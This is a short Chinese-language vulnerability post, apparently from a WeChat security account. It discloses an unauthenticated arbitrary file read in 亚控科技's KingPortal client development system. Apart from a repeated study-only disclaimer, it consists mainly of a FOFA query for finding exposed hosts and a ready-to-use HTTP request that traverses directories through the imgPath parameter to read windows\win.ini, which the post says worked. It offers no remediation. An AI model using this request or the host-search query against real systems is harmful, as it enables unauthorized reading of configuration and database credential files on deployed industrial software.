#  亚控科技 KingPortal 开发系统 imgPath 文件读取漏洞   
 HK安全小屋   2025-05-09 16:38  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
KingPortal客户端开发系统 img 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
影响版本：  
  
亚控科技  
KingPortal客户端  
  
  
FOFA:  
```
app="KingPortal客户端开发系统"
```  
  
  
POC：  
```
GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
```  
  
测试成功读取windows的win.ini文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0CgSzBNL66VLFA0SokF99ASNmSBeUazCt0oZPBdeXyf84Jmu1C5Qu6gZRiaeibiaFlp2C72rFgrshLg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
